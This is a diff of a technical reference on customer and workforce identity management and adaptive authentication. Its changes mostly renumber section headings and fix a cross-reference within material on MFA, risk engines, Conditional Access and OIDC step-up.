 **ePrivacy cookie consent.** The ePrivacy Directive (Article 5(3)) requires consent for storing or accessing information on a user's device — including authentication session cookies that are not strictly necessary. This adds a consent layer before the authentication flow even begins, creating additional friction that CIAM platforms must navigate carefully to avoid compounding the conversion loss from authentication steps.
 
-##### 25.1.4 User Experience Primacy
+##### 26.1.5 User Experience Primacy
 
 In CIAM, authentication friction is a **direct revenue risk**. Every additional step in the authentication flow — CAPTCHA, email verification, MFA enrollment prompt, terms-of-service acknowledgment — causes measurable user drop-off:
 
@@ -30537,7 +30539,7 @@ In CIAM, authentication friction is a **direct revenue risk**. Every additional 
 - Password complexity requirements that reject user-chosen passwords cause **10–20% of registration attempts** to be abandoned after the first rejection
 - Passkeys (§14) represent the CIAM-optimal MFA solution: phishing-resistant security with a UX indistinguishable from device unlock (Face ID, fingerprint, PIN)
 
-##### 25.1.5 Branding and Customisation
+##### 26.1.6 Branding and Customisation
 
 The authentication experience must be **branded** — custom login pages, themed emails, localised UX in the user's language, and consistent visual identity across web, mobile, and embedded authentication flows. CIAM platforms provide:
 
@@ -30546,7 +30548,7 @@ The authentication experience must be **branded** — custom login pages, themed
 - **Custom domains** — the login page is served from `auth.acme.com`, not `login.ciamprovider.com`
 - **Branded emails** — password reset, email verification, and MFA enrollment emails use the organisation's branding, sender domain, and tone of voice
 
-##### 25.1.6 CIAM Platform Landscape
+##### 26.1.7 CIAM Platform Landscape
 
 | Feature | Auth0 (Okta CIC) | Entra External ID | Amazon Cognito | PingOne | ForgeRock | Firebase Auth |
 |:--------|:-----------------|:------------------|:---------------|:--------|:----------|:-------------|
@@ -30567,7 +30569,7 @@ Platform selection depends on ecosystem alignment (Okta for broad integration, M
 #### 26.2 WIAM: Workforce Identity and Access Management
 WIAM serves **internal users** — employees, contractors, and partners with managed organisational relationships. The defining characteristics of WIAM are IT-managed provisioning, compliance-driven security mandates, directory-backed identity stores, and the subordination of user convenience to security requirements.
 
-##### 25.2.1 Scale
+##### 26.2.1 Scale
 
 Workforce directories are small compared to CIAM — thousands to hundreds of thousands of identities:
 
@@ -30579,7 +30581,7 @@ Workforce directories are small compared to CIAM — thousands to hundreds of th
 
 Even the largest enterprises (e.g., Walmart with ~2.1 million employees, Amazon with ~1.5 million) operate workforce directories at scales that CIAM platforms handle routinely. The architectural challenge in WIAM is not scale but **complexity** — organisational hierarchy, role-based access control, regulatory audit requirements, and lifecycle automation across hundreds of integrated applications.
 
-##### 25.2.2 IT-Managed Provisioning
+##### 26.2.2 IT-Managed Provisioning
 
 Workforce identities are **provisioned** — created by IT or HR workflows, not by the user. The dominant provisioning model is **HR-driven lifecycle management** using SCIM (System for Cross-domain Identity Management — RFC 7643/7644):
 
@@ -30801,7 +30803,7 @@ The end-to-end flow — from HRIS termination to SaaS session revocation — com
 
 **Directory synchronisation models.** Two primary synchronisation architectures connect on-premises or cloud directories to the IdP: (1) **push model** — Microsoft Entra Connect uses an on-premises agent that reads delta changes from the AD change log and writes them to Entra ID via the Microsoft Graph API at configurable intervals (default: 30 minutes), handling password hash synchronisation or pass-through authentication; (2) **pull model** — Okta's Active Directory Agent, installed on a domain-joined server, periodically queries the AD domain controller for changes (incremental delta queries every 3 minutes by default) and pushes them to the Okta tenant, supporting user provisioning/deprovisioning and group membership synchronisation.
 
-##### 25.2.3 Compliance-Driven Security
+##### 26.2.3 Compliance-Driven Security
 
 WIAM operates under regulatory frameworks that mandate specific security controls — controls that would be neither feasible nor appropriate for CIAM:
 
@@ -30836,7 +30838,7 @@ The cross-mapping reveals several areas of direct conflict — most notably data
 
 **NIS2 identity-specific impact:** The NIS2 Directive (EU 2022/2555, national transposition by October 2025) is significant because it represents the first EU regulation that explicitly mandates MFA for customer-facing systems in certain sectors (Article 21(2)(d)), blurring the traditional CIAM/WIAM boundary for regulated entities. Essential and important entities must implement IAM policies covering user authentication, access control, and identity lifecycle management (Annex I, §2), with supply chain security extending to CIAM platforms used for customer authentication.
 
-##### 25.2.4 Security Primacy
+##### 26.2.4 Security Primacy
 
 In WIAM, security requirements override user convenience. Organisations can mandate security controls because the employment relationship gives them authority over the user's authentication experience:
 
@@ -30846,7 +30848,7 @@ In WIAM, security requirements override user convenience. Organisations can mand
 
 As of February 2024, approximately 38% of Microsoft Entra ID monthly active users utilise MFA — a figure that is rapidly increasing as Microsoft enforces mandatory MFA for Azure portal access (fully enforced across 100% of Azure tenants by March 2025) and plans Phase 2 enforcement for Azure CLI, PowerShell, and IaC tools from October 2025. MFA blocks over 99.2% of account compromise attacks according to Microsoft's internal data.
 
-##### 25.2.5 Directory-Backed Identity
+##### 26.2.5 Directory-Backed Identity
 
 Workforce identities are stored in enterprise directories — structured, hierarchical databases designed for authentication and authorisation queries:
 
@@ -30856,7 +30858,7 @@ Workforce identities are stored in enterprise directories — structured, hierar
 - **Google Workspace Directory** — cloud-native directory for Google Workspace organisations
 - **LDAP directories** — OpenLDAP, 389 Directory Server, Oracle Internet Directory — legacy but still prevalent in Unix/Linux environments and academic institutions
 
-##### 25.2.6 Enterprise SSO
+##### 26.2.6 Enterprise SSO
 
 The workforce authentication experience is centred on **Single Sign-On (SSO)** — the user authenticates once to the organisational IdP and accesses all corporate applications without re-authenticating:
 
@@ -30864,7 +30866,7 @@ The workforce authentication experience is centred on **Single Sign-On (SSO)** �
 - **OIDC** (§3) — increasingly prevalent as modern SaaS applications adopt it; the user authenticates at the IdP and receives an ID token + access token. Preferred for new integrations due to simpler implementation and JSON-based tokens
 - **WS-Federation** (§6) — legacy protocol used primarily with Microsoft ADFS; declining but still present in organisations with on-premises infrastructure
 
-##### 25.2.7 WIAM Platform Landscape
+##### 26.2.7 WIAM Platform Landscape
 
 | Feature | Entra ID | Okta Workforce | Google Workspace | PingFederate | CyberArk | JumpCloud |
 |:--------|:---------|:---------------|:-----------------|:-------------|:---------|:----------|
@@ -30930,7 +30932,7 @@ flowchart TD
     style W5 text-align:left
 ```
 
-##### 25.3.1 CIAM Trust Model: Zero to Earned
+##### 26.3.1 CIAM Trust Model: Zero to Earned
 
 CIAM identities begin at **zero trust** — the organisation has no prior relationship with the user, no verified attributes, and no basis for trusting the claimed identity. Trust is built **incrementally** through a series of verification events over time:
 
@@ -30955,7 +30957,7 @@ flowchart LR
 - **Stage 3 — Identity proofing (IAL2):** For regulated services (banking KYC, government services, age-restricted content), the user submits a government-issued identity document (passport, driver's licence) and completes a liveness check (selfie video matching the document photo). This establishes that the user is a real person whose identity matches the claimed attributes. NIST SP 800-63A defines this as IAL2 — remote identity proofing with evidence of real-world existence
 - **Stage 4 — Behavioural trust:** Over time, the system accumulates transaction history, device fingerprints, behavioural biometrics patterns (§17.9), and risk scores. Long-standing accounts with consistent behaviour patterns are implicitly more trusted than new accounts with no history
 
-##### 25.3.2 Progressive Profiling
+##### 26.3.2 Progressive Profiling
 
 Progressive profiling is the CIAM-specific pattern of collecting user information **incrementally across multiple sessions** rather than requiring a comprehensive registration form upfront:
 
@@ -30978,7 +30980,7 @@ A structured progressive profiling strategy operates in five tiers, each gated b
 
 The key insight is that each tier is gated by a user action — the user chooses when to provide additional information, and the system escalates proofing requirements only when the requested action demands it.
 
-##### 25.3.3 WIAM Trust Model: Organisational Trust
+##### 26.3.3 WIAM Trust Model: Organisational Trust
 
 WIAM identities begin with **organisational trust** — the user was vetted during the hiring process (background check, identity verification, contract signing, reference checks) before any digital identity was created. The identity is provisioned by a trusted administrator (HR or IT) who is accountable for the accuracy of the identity attributes.
 
@@ -31000,7 +31002,7 @@ flowchart LR
 
 The critical difference: CIAM must **build** trust from zero; WIAM **inherits** trust from the employment process. This inherited trust justifies WIAM's ability to mandate strong security controls from day one — the identity has already been verified; the remaining task is to authenticate it securely.
 
-##### 25.3.4 Identity Proofing Levels (NIST SP 800-63A)
+##### 26.3.4 Identity Proofing Levels (NIST SP 800-63A)
 
 | Level | Description | Proofing Method | Typical Domain |
 |:------|:-----------|:----------------|:---------------|
@@ -31023,7 +31025,7 @@ CIAM typically operates at IAL1 for general registration with optional upgrade p
 
 Identity proofing in CIAM is performed incrementally — not at registration, but when the user first attempts a high-value transaction or accesses a sensitive feature. This progressive approach balances security with conversion.
 
-##### 25.3.5 Behavioral Trust Scoring
+##### 26.3.5 Behavioral Trust Scoring
 
 CIAM systems implement **progressive trust accumulation** — the user's trust level increases over time and through interactions, without requiring upfront proofing. This model is expressed mathematically as:
 
@@ -31113,7 +31115,7 @@ flowchart TD
 #### 26.4 MFA Adoption Patterns
 The MFA adoption landscape reveals the starkest operational difference between CIAM and WIAM — a difference driven not by technology availability but by the power dynamic between the identity system and its users.
 
-##### 25.4.1 WIAM: Mandatory, Policy-Enforced MFA
+##### 26.4.1 WIAM: Mandatory, Policy-Enforced MFA
 
 Enterprises can and do mandate MFA because the employment relationship gives the organisation authority over the authentication experience. A user who refuses to enroll in MFA simply cannot access corporate resources — and since those resources are required for their job, compliance is effectively universal.
 
@@ -31149,7 +31151,7 @@ Enterprises can and do mandate MFA because the employment relationship gives the
 
 The trajectory is clear: regulatory frameworks are converging on mandatory MFA with a preference for phishing-resistant methods (FIDO2/WebAuthn, platform authenticators). SMS OTP, while still widely deployed in CIAM, is being actively deprecated in WIAM contexts due to its vulnerability to SIM swapping and real-time phishing proxies.
 
-##### 25.4.2 CIAM: Optional, Friction-Conscious MFA
+##### 26.4.2 CIAM: Optional, Friction-Conscious MFA
 
 Consumer-facing services **cannot mandate MFA** without risking user abandonment. The fundamental constraint is that the user chose to use the service — they can choose to leave. The authentication experience competes directly with alternative services that may not require MFA. CIAM MFA strategies must balance security improvement against conversion loss:
 
@@ -31203,7 +31205,7 @@ Where $C_{\text{reset}}$ = password reset infrastructure costs (SMTP delivery, r
 #### 26.5 Self-Service vs. IT-Managed Lifecycle
 The credential and account lifecycle differs fundamentally between CIAM (self-service for everything) and WIAM (IT-managed with limited self-service):
 
-##### 25.5.1 CIAM Lifecycle
+##### 26.5.1 CIAM Lifecycle
 
 | Lifecycle Event | Owner | Mechanism |
 |:---------------|:------|:----------|
@@ -31217,7 +31219,7 @@ The credential and account lifecycle differs fundamentally between CIAM (self-se
 
 The CIAM platform provides the infrastructure for all self-service operations. The organisation's involvement is limited to defining the flows and policies — the user executes every lifecycle operation independently.
 
-##### 25.5.2 WIAM Lifecycle
+##### 26.5.2 WIAM Lifecycle
 
 | Lifecycle Event | Owner | Mechanism |
 |:---------------|:------|:----------|
@@ -31231,7 +31233,7 @@ The CIAM platform provides the infrastructure for all self-service operations. T
 | **Account deprovisioning** | HR/IT | Automated via SCIM when HR status changes to "terminated". Immediate actions: revoke all sessions, invalidate tokens, disable account, remove from all groups. NIST and CIS benchmarks recommend deprovisioning within 24 hours of termination |
 | **Off-boarding compliance** | IT + Legal | Retain audit logs per regulatory requirements; archive mailbox if required; transfer ownership of shared resources |
 
-##### 25.5.3 Account Recovery: The Security Divergence Point
+##### 26.5.3 Account Recovery: The Security Divergence Point
 
 Account recovery is the lifecycle event where the CIAM/WIAM divergence creates the most significant security implications:
 
@@ -31289,7 +31291,7 @@ flowchart LR
 #### 26.6 Convergence Patterns (CIAM and WIAM Unified Platforms)
 The emerging trend in identity platform architecture is **convergence** — organisations seeking a single platform that handles both customer and employee identities. The business drivers are clear: reduced operational complexity, consistent security policy enforcement, and support for hybrid identity scenarios (e.g., a partner who is both a business customer and a B2B collaborator).
 
-##### 25.6.1 Microsoft Entra: Unified Platform Architecture
+##### 26.6.1 Microsoft Entra: Unified Platform Architecture
 
 Microsoft's convergence strategy is the most architecturally mature among major vendors. Entra ID provides workforce identity; **Entra External ID** provides CIAM — both built on the same underlying platform:
 
@@ -31308,7 +31310,7 @@ Microsoft's convergence strategy is the most architecturally mature among major 
 
 Microsoft discontinued Azure AD B2C for new customers in May 2025, directing all new CIAM deployments to Entra External ID. Existing B2C tenants continue to be supported through at least 2030. The convergence is strategic — the same Conditional Access engine, the same Microsoft Graph API, and the same monitoring infrastructure (Entra ID Protection) serve both identity domains.
 
-##### 25.6.2 Okta: Customer Identity Cloud and Workforce Identity Cloud
+##### 26.6.2 Okta: Customer Identity Cloud and Workforce Identity Cloud
 
 Okta's convergence strategy operates through two distinct but increasingly integrated products:
 
@@ -31321,7 +31323,7 @@ Key convergence features — Okta is building a unified "identity security fabri
 - **Shared threat intelligence** — risk signals from Okta ThreatInsight feed into both workforce and customer identity decisions
 - **Unified governance** — identity governance policies spanning both workforce and customer directories
 
-##### 25.6.3 Challenges of Convergence
+##### 26.6.3 Challenges of Convergence
 
 Despite vendor convergence offerings, full unification of CIAM and WIAM on a single platform remains architecturally difficult due to structural differences that cannot be abstracted away:
 
@@ -31351,7 +31353,7 @@ Despite vendor convergence offerings, full unification of CIAM and WIAM on a sin
 
 **Realistic convergence assessment.** Despite vendor marketing, true architectural convergence faces several unsolved challenges. Convergence **works** for: single vendor management (one contract, one admin portal, one support channel), shared security monitoring and alerting (SIEM integration, anomaly detection), unified audit reporting (cross-population compliance dashboards), and shared authentication protocols (OIDC federation between workforce and customer tenants). Convergence **does not solve**: conflicting security policies (mandatory vs. optional MFA), conflicting data retention requirements (employee records vs. GDPR deletion rights), conflicting session management models (8-hour workforce vs. 30-day CIAM sessions), conflicting consent requirements, and directory scale mismatch (thousands of employees vs. millions of customers). Organisations should maintain separate identity platforms for CIAM and WIAM populations, connected by OIDC federation for cross-population access scenarios — the convergence value is in vendor consolidation and operational integration, not architectural unification.
 
-##### 25.6.4 The B2B2C Pattern
+##### 26.6.4 The B2B2C Pattern
 
 The most complex hybrid identity scenario is **B2B2C** — a business customer (B2B employee) accesses a platform that also serves end consumers (B2C). Example: a financial advisor (B2B — authenticated via their firm's IdP through SAML/OIDC federation) and a retail banking customer (B2C — authenticated via the bank's CIAM with email/password + MFA) both operate within the same banking platform but with different trust levels, access models, and session requirements.
 
@@ -31931,7 +31933,7 @@ The **Relying Party Application** mathematically validates the step-up JWT conte
 
 **Key takeaways from the comparison:**
 
-1. **Security vs. UX is not a false dichotomy** — In CIAM, every additional authentication step has a measurable conversion cost (§26.1.2a). In WIAM, security mandates are non-negotiable; the UX optimisation problem is how to make mandatory security as frictionless as possible (passkeys, trusted device certificates).
+1. **Security vs. UX is not a false dichotomy** — In CIAM, every additional authentication step has a measurable conversion cost (§26.1.3). In WIAM, security mandates are non-negotiable; the UX optimisation problem is how to make mandatory security as frictionless as possible (passkeys, trusted device certificates).
 
 2. **Convergence is operational, not architectural** — Vendor marketing presents unified identity platforms, but the underlying policy engines, data models, and session management systems remain separate. The practical value of convergence is in vendor consolidation and administrative simplification, not in merging identity populations into a single store (§26.6.3).
 
@@ -31945,7 +31947,7 @@ The **Relying Party Application** mathematically validates the step-up JWT conte
 #### 26.8 MFA Enrollment and Recovery Security Gaps
 MFA enrollment and recovery flows are frequently the weakest link in an organization's authentication posture. These flows are designed for usability (make it easy for users to set up MFA and recover from lost devices), but the usability focus often comes at the expense of security.
 
-##### 25.8.1 Enrollment-Phase Attacks
+##### 26.8.1 Enrollment-Phase Attacks
 
 **Same-session enrollment.** The most critical enrollment vulnerability occurs when an attacker who has already compromised the user's password can enroll their own MFA device. The flow:
 
@@ -31960,7 +31962,7 @@ MFA enrollment and recovery flows are frequently the weakest link in an organiza
 
 **Mitigation:** MFA enrollment must only be accessible after the user has already authenticated with their primary credentials (not via a link in an email). The enrollment page should display the user's identity information prominently so the user can verify they are on the correct account.
 
-##### 25.8.2 Recovery-Phase Attacks
+##### 26.8.2 Recovery-Phase Attacks
 
 **Recovery as an attack vector.** MFA recovery flows are often weaker than the primary authentication flow. Common weaknesses:
 
@@ -31971,7 +31973,7 @@ MFA enrollment and recovery flows are frequently the weakest link in an organiza
 
 **Mitigation:** Recovery flows should meet the same security standard as the primary authentication flow. If the primary flow requires WebAuthn, the recovery flow should require WebAuthn (or an equivalent assurance level). For high-value accounts, require in-person verification for MFA recovery.
 
-##### 25.8.3 Anti-Pattern Summary
+##### 26.8.3 Anti-Pattern Summary
 
 | Anti-Pattern | Risk | Mitigation |
 |:-------------|:-----|:-----------|
@@ -32113,7 +32115,7 @@ flowchart TD
     style T2 text-align:left
 ```
 
-##### 26.1.1 Device Signals
+##### 28.1.1 Device Signals
 
 Device signals assess the security posture and trustworthiness of the endpoint from which the authentication attempt originates:
 
@@ -32128,7 +32130,7 @@ Device signals assess the security posture and trustworthiness of the endpoint f
 
 **Device Fingerprint Entropy.** Beyond the device signals listed above, browser-based device fingerprinting combines multiple attributes (Canvas hash, WebGL renderer, font enumeration, screen resolution, timezone, plugins, AudioContext) into a composite identifier. The discriminative power of a fingerprint is measured by its Shannon entropy ($H(X) = -\sum P(x_i) \log_2 P(x_i)$). Individual components contribute 2–12 bits of entropy each (User-Agent: ~4–6 bits, Canvas: ~8–12 bits, WebGL: ~7–11 bits), with the combined fingerprint providing 15–25 bits — sufficient to distinguish individual devices. Research by Laperdrix et al. (2016) found that a cross-browser fingerprint combining Canvas, WebGL, and font enumeration achieved 83.6% accuracy in device re-identification across sessions.
 
-##### 26.1.2 Network Signals
+##### 28.1.2 Network Signals
 
 | Signal | Description | Risk Implication |
 |:-------|:-----------|:----------------|
@@ -32137,7 +32139,7 @@ Device signals assess the security posture and trustworthiness of the endpoint f
 | **Autonomous System Number (ASN)** | The network operator that owns the source IP — enterprise ASN (known corporate egress), cloud provider ASN (potential attacker infrastructure), residential ISP ASN | Unexpected ASN for the user's profile → elevated risk |
 | **Proxy/VPN detection** | Whether the connection routes through a known commercial VPN, open proxy, or anonymising relay | Anonymising infrastructure → elevated risk (legitimate VPN use must be accounted for) |
 
-##### 26.1.3 Location Signals
+##### 28.1.3 Location Signals
 
 | Signal | Description | Risk Implication |
 |:-------|:-----------|:----------------|
@@ -32187,7 +32189,7 @@ flowchart LR
     style Eval text-align:left
 ```
 
-##### 26.1.4 Behavioural Signals
+##### 28.1.4 Behavioural Signals
 
 | Signal | Description | Risk Implication |
 |:-------|:-----------|:----------------|
@@ -32197,7 +32199,7 @@ flowchart LR
 | **Keyboard/mouse dynamics** (§17.9) | Typing cadence, mouse movement patterns, touchscreen pressure — behavioural biometrics that create a continuous user profile | Deviation from established profile → session takeover signal |
 | **User risk score** | Accumulated risk from previous suspicious activities, unresolved security alerts, and identity protection detections | High accumulated risk → elevated authentication requirements until remediated |
 
-##### 26.1.5 Temporal Signals
+##### 28.1.5 Temporal Signals
 
 | Signal | Description | Risk Implication |
 |:-------|:-----------|:----------------|
@@ -32214,7 +32216,7 @@ $$
 
 where $K$ is the number of access modes (e.g., morning logins, lunchtime logins, evening logins) and $\alpha_k$ are the mixing weights. The risk contribution scales with the distance from the user's typical login time in standard deviations: within 1σ contributes 0.0–0.2 (normal), between 1–2σ contributes 0.2–0.5 (unusual but plausible), between 2–3σ contributes 0.5–0.8 (significantly anomalous), and beyond 3σ contributes 0.8–1.0 (highly anomalous). Additional additive risk is applied for the 02:00–06:00 attack window (+0.3) and public holidays (+0.2).
 
-##### 26.1.6 Authentication History Signals
+##### 28.1.6 Authentication History Signals
 
 | Signal | Description | Risk Implication |
 |:-------|:-----------|:----------------|
@@ -32234,7 +32236,7 @@ Adaptive authentication systems operate across a spectrum of models, each tradin
 
 In practice, production systems combine multiple models: risk-score-based evaluation as the primary mechanism, with trigger-based step-up for high-sensitivity operations and continuous authentication for extended sessions.
 
-##### 26.2.1 Risk Score Computation
+##### 28.2.1 Risk Score Computation
 
 The risk engine aggregates the raw signals from §29 into a composite risk assessment. Two fundamental approaches exist:
 
@@ -32267,7 +32269,7 @@ Production risk engines typically combine both approaches — ML models generate
 
 Calibration quality is measured using the **Brier score** ($\text{BS} = \frac{1}{N}\sum_{i=1}^{N}(f_i - o_i)^2$, where $f_i$ is the predicted probability and $o_i$ is the observed outcome) — lower is better, with 0 representing perfect calibration.
 
-##### 26.2.2 Policy Evaluation Pipeline
+##### 28.2.2 Policy Evaluation Pipeline
 
 The risk engine operates as a real-time pipeline that executes for every authentication attempt:
 
@@ -32544,7 +32546,7 @@ The relying party application securely exchanges the code and consumes the final
 
 This mapping complements the trigger-based step-up model in §28.5.1 by adding the **session lifetime** dimension — while triggers fire at specific moments (resource access, operation initiation), session impact policies are enforced continuously throughout the session.
 
-##### 26.2.3 Vendor Risk Engine Implementations
+##### 28.2.3 Vendor Risk Engine Implementations
 
 **Microsoft Entra ID Protection** computes two risk scores — **user risk** and **sign-in risk** — each classified as low, medium, or high:
 
@@ -32569,7 +32571,7 @@ This mapping complements the trigger-based step-up model in §28.5.1 by adding t
 #### 28.3 Adaptive MFA: Contextual Triggers and Friction Reduction
 The core principle of adaptive MFA is economically elegant: **don't require MFA when the risk is low; require strong MFA when the risk is high.** Static MFA policies — "always require MFA for every login" — impose unnecessary friction on low-risk access and fail to differentiate between a routine corporate login and a high-risk access attempt from an anomalous context.
 
-##### 26.3.1 Risk-Tiered Authentication
+##### 28.3.1 Risk-Tiered Authentication
 
 Adaptive authentication creates a tiered response model:
 
@@ -32596,7 +32598,7 @@ The choice of MFA method within each tier matters. Different methods offer diffe
 | Smart card / PIV | AAL3 | Yes | High | Card reader |
 | Biometric (fingerprint/face) | AAL2 | Medium | Very Low | Biometric hardware |
 
-##### 26.3.2 The Friction Budget
+##### 28.3.2 The Friction Budget
 
 Every authentication flow operates within a "friction budget" — the cumulative amount of UX friction the user will tolerate before abandoning the session. Adaptive authentication allocates this budget strategically:
 
@@ -32615,7 +32617,7 @@ $$
 
 where $C_{FP}$ is the cost of a false positive (user frustration, support calls), $C_{FN}$ is the cost of a false negative (breach cost), and $C_{MFA}$ is the marginal cost of presenting an MFA challenge.
 
-##### 26.3.3 MFA Fallback Chains
+##### 28.3.3 MFA Fallback Chains
 
 When the primary MFA method fails or is unavailable, a fallback chain determines the next method to attempt. The chain should be ordered by security strength descending:
 
@@ -32628,14 +32630,14 @@ When the primary MFA method fails or is unavailable, a fallback chain determines
 
 Each fallback step reduces security — an attacker who cannot defeat FIDO2 might successfully phish an SMS OTP. Fallback chains should follow four guardrails: (1) **log fallback events** for security monitoring — a user consistently falling back to SMS may indicate a lost security key; (2) **limit fallback depth** per authentication event — allowing 5+ fallback attempts provides attack surface; (3) **apply additional controls** to weaker fallbacks — SMS OTP should only be accepted for low/medium risk events, never for high-risk events; (4) **notify users** when a fallback is invoked, so they are aware that a weaker method is being used.
 
-##### 26.3.4 Grace Period Management
+##### 28.3.4 Grace Period Management
 
 A grace period allows a user to complete a step-up authentication after being challenged without losing their current session context. The grace period is computed as $T_{grace} = \max(T_{min}, T_{remaining\_session} - T_{buffer})$, where $T_{min}$ is typically 3 minutes and $T_{buffer}$ is 60 seconds. If the user does not complete step-up within the grace period, the original session continues but access to the protected resource remains denied — the user can re-navigate to trigger a new step-up challenge.
 
 #### 28.4 Conditional Access Policies (Entra ID Model)
 Microsoft Entra Conditional Access is the most widely deployed conditional access system in enterprise environments. Its policy model has become the de facto industry standard for expressing risk-based authentication requirements.
 
-##### 26.4.1 Policy Structure
+##### 28.4.1 Policy Structure
 
 Every Conditional Access policy follows a declarative **IF → THEN** structure:
 
@@ -32729,7 +32731,7 @@ This Okta policy applies a factor chain (password + push notification) when the 
 
 </details>
 
-##### 26.4.2 Authentication Strength
+##### 28.4.2 Authentication Strength
 
 Authentication strength is Entra's mechanism for requiring **specific authentication methods** rather than generic "any MFA." Built-in authentication strengths:
 
@@ -32741,7 +32743,7 @@ Authentication strength is Entra's mechanism for requiring **specific authentica
 
 Organisations can create **custom authentication strengths** — for example, "Hardware YubiKey only" for administrative roles, or "Passkey or Windows Hello" for standard users. Custom strengths select from the full list of available authentication methods and can include additional constraints (e.g., require FIDO2 with specific AAGUIDs to restrict to organisationally approved hardware keys).
 
-##### 26.4.3 Policy Evaluation Model
+##### 28.4.3 Policy Evaluation Model
 
 Conditional Access policies are evaluated **simultaneously, not sequentially.** All enabled policies are assessed against the current authentication context. The enforcement follows an additive model:
 
@@ -32755,7 +32757,7 @@ This additive model means that policies cannot weaken each other — a permissiv
 #### 28.5 Step-Up Authentication: Trigger Conditions and Challenge Selection
 Step-up authentication — requiring stronger authentication during an existing session when the user attempts a high-risk operation — addresses a fundamental limitation of point-in-time authentication: the initial login establishes a baseline trust level, but certain operations within the session require a higher level of assurance than the login ceremony provided.
 
-##### 26.5.1 Trigger Conditions
+##### 28.5.1 Trigger Conditions
 
 | Trigger | Description | Example |
 |:--------|:-----------|:--------|
@@ -32770,7 +32772,7 @@ Step-up authentication — requiring stronger authentication during an existing 
 | **Behavioural anomaly** | Unusual access pattern or interaction behaviour that deviates from the user's established baseline | Off-hours access, atypical transaction volume, navigation pattern divergence (§17.9), command sequences inconsistent with user's role |
 | **Regulatory requirement** | An applicable regulation mandates re-authentication for the specific operation | PSD2 SCA requires re-authentication for payment transactions exceeding €30 or after 5 consecutive transactions without SCA |
 
-##### 26.5.2 Challenge Selection
+##### 28.5.2 Challenge Selection
 
 The step-up engine selects the authentication challenge based on the sensitivity of the operation being attempted:
 
@@ -32782,7 +32784,7 @@ The step-up engine selects the authentication challenge based on the sensitivity
 
 **Transaction Signing Protocol.** For high-sensitivity operations (financial transfers, privileged actions), step-up authentication extends beyond "prove who you are" to "prove who you are and that you approve this specific action." The protocol flow is: (1) user initiates high-value action; (2) backend generates transaction context (amount, payee, reference, timestamp); (3) backend sends step-up request with transaction data bound to the challenge; (4) user's authenticator displays the transaction details; (5) user explicitly approves — e.g., "Transfer EUR 50,000 to IBAN DE89...760"; (6) authenticator signs the transaction data using HMAC (symmetric) or an asymmetric signature; (7) backend verifies the signature and transaction data match before executing the action. This ensures the user's authentication is cryptographically bound to the specific transaction, preventing man-in-the-middle modification of transaction parameters.
 
-##### 26.5.3 OIDC Step-Up Protocol
+##### 28.5.3 OIDC Step-Up Protocol
 
 The OIDC specification provides protocol-level support for step-up authentication through the `acr_values` parameter and the `claims` request parameter. When an application determines that the current session's assurance level is insufficient for the requested operation, it redirects the user back to the IdP with an explicit request for a higher assurance level:
 
@@ -33131,7 +33133,7 @@ xychart-beta
     line [85, 88, 83, 82, 15, 5]
 ```
 
-##### 26.6.1 Re-Evaluation Signals
+##### 28.6.1 Re-Evaluation Signals
 
 **Behavioural biometrics** (§17.9): Continuous monitoring of keyboard dynamics, mouse movement patterns, touchscreen interaction characteristics, and application usage patterns. A session takeover — where an attacker replaces the legitimate user mid-session — produces a detectable shift in behavioural profile. The continuous authentication system can trigger a step-up challenge or terminate the session when the behavioural confidence score drops below a threshold.
 
@@ -33186,7 +33188,7 @@ $$\log P = \sum_{t=t_0}^{t_{\text{current}}} \log P(x_t | \text{user\_model})$$
 | Behavioural anomaly detected | 0.6–0.8 | Medium | Increase monitoring frequency | None (invisible) |
 | Impossible travel mid-session | 0.9–1.0 | Very High | Immediate session termination | High (potential data loss) |
 
-##### 26.6.2 Microsoft Continuous Access Evaluation (CAE)
+##### 28.6.2 Microsoft Continuous Access Evaluation (CAE)
 
 CAE — the most mature production implementation of continuous authentication at scale — establishes a direct communication channel between the Entra ID token service and resource providers (Exchange Online, SharePoint Online, Teams). When a critical event occurs, the resource provider is notified and can reject the access token immediately — reducing the vulnerability window from the token's natural lifetime (up to 1 hour by default, or up to 28 hours for CAE-capable resources) to near-real-time.
 
@@ -33216,7 +33218,7 @@ CAE is enabled by default for all tenants using supported Microsoft 365 workload
 #### 28.7 Authentication Context (OIDC acr/amr Claims)
 The OIDC specification defines two claims that communicate the authentication context of a session — what assurance level was achieved and what methods were used. These claims enable federated systems to make access decisions based on the quality of the authentication, not just its success.
 
-##### 26.7.1 acr: Authentication Context Class Reference
+##### 28.7.1 acr: Authentication Context Class Reference
 
 The `acr` claim in the OIDC ID token indicates the **authentication assurance level** achieved during the session. It is a string value — either a URI or a short identifier — that maps to a defined set of authentication requirements.
 
@@ -33235,7 +33237,7 @@ The `acr` claim is set by the IdP based on the authentication methods used durin
 
 **Processing Rules.** Per (OIDC Core, §3.1.2.1), the `acr_values` parameter is a space-separated list of strings. The OP processes it as follows: if the OP supports any of the requested values, it authenticates the user at that level and returns the corresponding `acr` claim; if the OP does not support any requested value, it returns an error (`invalid_request`). When multiple values are provided, the OP should select the highest assurance level it can satisfy from the list — though the specification does not mandate preference ordering, this is the conventional interpretation.
 
-##### 26.7.2 amr: Authentication Methods References
+##### 28.7.2 amr: Authentication Methods References
 
 The `amr` claim is a JSON array of strings listing the **specific authentication methods** used during the session. Defined by RFC 8176 (Authentication Method Reference Values), the claim provides granular visibility into exactly how the user authenticated — not just the assurance level achieved, but the specific factors employed.
 
@@ -33264,7 +33266,7 @@ The `amr` claim is a JSON array of strings listing the **specific authentication
 
 The `amr` claim enables fine-grained access control decisions — an application protecting financial transactions might require `amr` to contain `hwk` (hardware key) rather than merely `mfa` (which could be satisfied by a phishable method like SMS OTP).
 
-##### 26.7.3 Step-Up Coordination via acr/amr
+##### 28.7.3 Step-Up Coordination via acr/amr
 
 The combination of `acr` and `amr` claims enables a coordinated step-up pattern across federated systems:
 
@@ -33285,7 +33287,7 @@ This pattern allows an IdP to progressively strengthen a session's assurance lev
 
 **Cross-Federation ACR Mapping.** When authentication involves multiple federated identity providers (e.g., in academic federations like eduGAIN or government identity ecosystems), ACR values from different domains must be mapped to a common assurance framework. An SP receiving an ACR from a federated IdP must determine whether it meets the SP's requirement — a process complicated by semantic ambiguity (two IdPs may use the same URI but implement different procedures), the absence of a standard mapping protocol, transitive trust erosion (each federation hop may weaken the assurance claim), and regulatory divergence (different jurisdictions define "high assurance" differently).
 
-##### 26.7.4 PSD2 Dynamic Linking
+##### 28.7.4 PSD2 Dynamic Linking
 
 PSD2's Strong Customer Authentication (SCA) requires that the authentication code be **dynamically linked to the specific amount and payee** of a payment transaction. However, PSD2 also permits risk-based SCA exemptions that allow certain low-risk transactions to proceed without full SCA:
 
